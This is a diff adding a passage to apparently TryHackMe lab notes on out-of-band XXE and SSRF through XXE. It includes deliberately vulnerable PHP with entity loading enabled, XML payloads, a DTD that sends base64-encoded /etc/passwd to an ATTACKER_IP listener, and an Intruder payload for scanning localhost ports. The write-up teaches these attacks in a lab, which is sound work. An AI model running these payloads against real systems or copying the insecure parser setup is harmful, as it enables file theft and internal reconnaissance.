@@ -258,5 +258,177 @@ Contents of /opt/14232d6db2b5fd937aa92e8b3c48d958.txt
 
 <figure><img src="../../.gitbook/assets/image (1088).png" alt=""><figcaption></figcaption></figure>
 
+## Exploiting XXE - Out-of-Band
+
+#### Out-Of-Band XXE
+
+On the other hand, to demonstrate this vulnerability, go to [http://10.10.89.251/index.php](http://10.10.89.251/index.php). The application uses the below code when a user uploads a file:
+
+```php
+libxml_disable_entity_loader(false);
+$xmlData = file_get_contents('php://input'); 
+
+$doc = new DOMDocument();
+$doc->loadXML($xmlData, LIBXML_NOENT | LIBXML_DTDLOAD);
+
+$links = $doc->getElementsByTagName('file');
+
+foreach ($links as $link) {
+    $fileLink = $link->nodeValue;
+    $stmt = $conn->prepare("INSERT INTO uploads (link, uploaded_date) VALUES (?, NOW())");
+    $stmt->bind_param("s", $fileLink);
+    $stmt->execute();
+    
+    if ($stmt->affected_rows > 0) {
+        echo "Link saved successfully.";
+    } else {
+        echo "Error saving link.";
+    }
+    
+    $stmt->close();
+}
+```
+
+The code above doesn't return the values of the submitted XML data. Hence, the term Out-of-Band since the exfiltrated data has to be captured using an attacker-controlled server.
+
+For this attack, we will need a server that will receive data from other servers. You can use Python's http.server module, although there are options out there, like Apache or Nginx. Using AttackBox or your own machine, start a Python web server by using the command:
+
+Starting a Python Webserver
+
+**Kali**
+
+```shell-session
+python3 -m http.server 1337
+```
+
+Upload a file in the application and monitor the request that is sent to `submit.php` using your Burp. Forward the request below to Burp Repeater.
+
+![Forward the request to repeater](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/0ac465ae50933198b249c9e622cb8d9d.png)\
+
+
+Using the payload below, replace the value of the XML file in the request and resend it. Note that you have to replace the ATTACKER\_IP variable with your own IP.
+
+```xml
+<!DOCTYPE foo [
+<!ELEMENT foo ANY >
+<!ENTITY xxe SYSTEM "http://$KALI:1337/" >]>
+<upload><file>&xxe;</file></upload>
+```
+
+Send the modified HTTP request.
+
+\
+
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/08cbba233f61b8bc17e166c089931bd6.png" alt=""><figcaption></figcaption></figure>
+
+After sending the modified HTTP request, the Python web server will receive a connection from the target machine. The establishment of a connection with the server indicates that sensitive information can be extracted from the application.
+
+\
+
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/8cfa02d850cc73372dd6993acd9265fd.png" alt=""><figcaption></figcaption></figure>
+
+We can now create a DTD file that contains an external entity with a PHP filter to exfiltrate data from the target web application.
+
+Save the sample DTD file below and name it as `sample.dtd`. The payload below will exfiltrate the contents of `/etc/passwd` and send the response back to the attacker-controlled server:
+
+**sample.dtd**
+
+```xml
+<!ENTITY % cmd SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % oobxxe "<!ENTITY exfil SYSTEM 'http://ATTACKER_IP:1337/?data=%cmd;'>">
+%oobxxe;
+```
+
+DTD Payload Explained
+
+The DTD begins with a declaration of an entity `%cmd` that points to a system resource. The **`%cmd`** entity refers to a resource within the PHP filter protocol `php://filter/convert.base64-encode/resource=/etc/passwd`. It retrieves the content of `/etc/passwd`, a standard file in Unix-based systems containing user account information. The `convert.base64-encode` filter encodes the content in Base64 format to avoid formatting problems. The **`%oobxxe`** entity contains another XML entity declaration, `exfil`, which has a system identifier pointing to the attacker-controlled server. It includes a parameter named data with `%cmd`, representing the Base64-encoded content of `/etc/passwd`. When `%oobxxe;` is parsed, it creates the `exfil` entity that connects to an attacker's server (`http://ATTACKER_IP:1337/`). The parameter `?data=%cmd` sends the Base64-encoded content from `%cmd`.
+
+Go back to the repeater and change your payload to:
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE upload SYSTEM "http://ATTACKER_IP:1337/sample.dtd">
+<upload>
+    <file>&exfil;</file>
+</upload>
+```
+
+\
+
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/2e5178fb66945cbbb4e855d013690c9c.png" alt=""><figcaption></figcaption></figure>
+
+Resend the request and check your terminal. You will receive two (2) requests. The first is the request for the sample.dtd file, and the second is the request sent by the vulnerable application containing the encoded /etc/passwd.
+
+![Two external connections received in the webserver with the exfiltrated data](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/9c87f37b1fed79110958f8cdfc492c93.png)
+
+Decoding the exfiltrated base64 data will show that it contains the base64 value of /etc/passwd.
+
+\
+
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/4ea510718c602ecaa7de8357599e8ab3.png" alt=""><figcaption></figcaption></figure>
+
+## SSRF + XXE
+
+**Server-Side Request Forgery (SSRF)** attacks occur when an attacker abuses functionality on a server, causing the server to make requests to an unintended location. In the context of XXE, an attacker can manipulate XML input to make the server issue requests to internal services or access internal files. This technique can be used to scan internal networks, access restricted endpoints, or interact with services that are only accessible from the server’s local network.
+
+#### Internal Network Scanning
+
+Consider a scenario where a vulnerable server hosts another web application internally on a non-standard port. An attacker can exploit an XXE vulnerability that makes the server send a request to its own internal network resource.
+
+For example, using the captured request from the in-band XXE task, send the captured request to Burp Intruder and use the payload below:
+
+```xml
+<!DOCTYPE foo [
+  <!ELEMENT foo ANY >
+  <!ENTITY xxe SYSTEM "http://localhost:§10§/" >
+]>
+<contact>
+  <name>&xxe;</name>
+  <email>test@test.com</email>
+  <message>test</message>
+</contact>
+```
+
+The external entity is set to fetch data from `http://localhost:§10§/`. Intruder will then reiterate the request and search for an internal service running on the server.
+
+Steps to brute force for open ports:
+
+1\. Once the captured request from the In-Band XXE is in Intruder, click the Add `§` button while highlighting the port.
+
+\
+
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/593a4fc9649f7eb2fec803104b3a897b.png" alt=""><figcaption></figcaption></figure>
+
+2\. In the Payloads tab, set the payload type to Numbers with the Payload settings from 1 to 65535.
+
+![Payloads tab with the right settings](https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/e5358d3d6bde1dda471a34d9e207598e.png)
+
+3\. Once done, click the Start attack button and click the Length column to sort which item has the largest size. The difference in the server's response size is worth further investigation since it might contain information that is different compared to the other intruder requests.
+
+\
+
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/6f184ed4700daf4859c6d4314a0205f5.png" alt=""><figcaption></figcaption></figure>
+
+\
+
+
+<figure><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/645b19f5d5848d004ab9c9e2/room-content/634833be32484b2bfeb5761d3de57611.png" alt=""><figcaption></figcaption></figure>
+
+**How the Server Processes This**:
+
+The entity `&xxe;` is referenced within the `<name>` tag, triggering the server to make an HTTP request to the specified URL when the XML is parsed. The response of the requested resource will then be included in the server response. If an application contains secret keys, API keys, or hardcoded passwords, this information can then be used in another form of attack, such as password reuse.
+
+#### Potential Security Implications
+
+* **Reconnaissance**: Attackers can discover services running on internal network ports and gain insights into the server's internal architecture.
+* **Data Leakage**: If the internal service returns sensitive information, it could be exposed externally through errors or XML data output.
+* **Elevation of Privilege**: Accessing internal services could lead to further exploits, potentially escalating an attacker's capabilities within the network.
+
 
 
